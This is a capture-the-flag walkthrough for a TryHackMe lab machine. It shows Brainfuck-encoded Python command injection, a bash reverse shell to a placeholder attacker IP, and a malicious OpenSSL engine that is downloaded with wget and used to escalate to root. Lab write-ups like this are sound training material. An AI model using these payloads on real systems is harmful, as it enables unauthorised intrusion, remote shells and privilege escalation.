# [Mindgames](https://tryhackme.com/room/mindgames)

## Just a terrible idea...

# Capture the flags

## No hints. Hack it. Don't give up if you get stuck, enumerate harder

### User flag.

_user.txt_

1. Perform network enumeration to identify open services

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Navigate to `http://<TARGET_IP>` to examine the web application

   - The page contains "Hello, World", and Fibonacci sequence code written in Python-Brainfuck programming language
   - Features an interactive Brainfuck compiler/interpreter

3. Research Brainfuck syntax using resources like [dCode Brainfuck Decoder](https://www.dcode.fr/brainfuck-language).

4. Convert Python payload to Brainfuck, and craft payload to read the user flag

```python
# Python code:
__import__('os').system('ls -la ../')
```

```
Brainfuck:
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>-----..++++++++++.++++.+++.-.+++.++.---------------------..<<++++++++++.-.>>++++++++++++++++.++++.<<.++.+++++.>>.++++++.------.+.---------------.++++++++.<<------.-.>>-.+++++++.<<-------.+++++++++++++.>>-------.-----------.<<-------------.++++++++++++++..+.--------.++.
```

[SCREEN02]

```python
# Python code
__import__('os').system('cat ../user.txt')
```

```
Brainfuck:
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>-----..++++++++++.++++.+++.-.+++.++.---------------------..<<++++++++++.-.>>++++++++++++++++.++++.<<.++.+++++.>>.++++++.------.+.---------------.++++++++.<<------.-.>>----------.--.+++++++++++++++++++.<<-------.++++++++++++++..+.>>+.--.--------------.+++++++++++++.<<-.>>++.++++.----.<<-------.++.
```

[SCREEN03]

---

### Root flag.

_/root/root.txt_

1. Set up netcat listener on attacking machine

```bash
nc -lvnp 4444
```

2. Create Python reverse shell payload

```python
__import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"')
```

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>-----..++++++++++.++++.+++.-.+++.++.---------------------..<<++++++++++.-.>>++++++++++++++++.++++.<<.++.+++++.>>.++++++.------.+.---------------.++++++++.<<------.-.>>-----------.-.++++++++++++++++++.-----------.<<-------.+++++++++++++.>>+.<<-------------.>--------.<++++++.------.+++++++++++++++.>>-----.+.+++++++++++++++++.<<.>>--.-----------------.+++++++++++++.<<.++.-.--.+++.-.--.+++.-.++.----.>-----.<+.+++++....--------------------.>---------.++++++++++++++.<++++++.+++++++++++.----------.++.
```

3. Upgrade to fully interactive shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

4. Search for capabilities-based privilege escalation vectors

```bash
getcap -r / 2>/dev/null
```

[SCREEN04]

5. Ensure development libraries are available

```bash
sudo apt-get install libssl-dev
```

6. Create malicious OpenSSL engine

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

7. Compile the malicious engine as a shared library

```bash
gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcrypto exploit.o
```

8. Set up HTTP server on attacking machine

```bash
python -m SimpleHTTPServer
```

9. On target machine, download and execute the exploit

```bash
cd /tmp
wget <ATTACKER_IP>:8000/exploit.so
openssl req -engine ./exploit.so
cat /root/root.txt
```

[SCREEN05]
